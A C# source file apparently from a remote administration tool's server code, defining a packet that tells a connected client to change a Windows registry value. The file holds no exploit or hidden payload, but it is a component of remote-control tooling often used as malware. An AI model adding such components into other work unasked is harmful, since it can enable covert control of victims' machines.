using System;
using System.Linq;
using System.Text;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.KayıtDefteri;

namespace xServer.KuuhakuCekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoChangeRegistryValue : IPacket
    {
        public string KeyPath { get; set; }
        public RegValueData Value { get; set; }

        public DoChangeRegistryValue(string keyPath, RegValueData value)
        {
            KeyPath = keyPath;
            Value = value;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
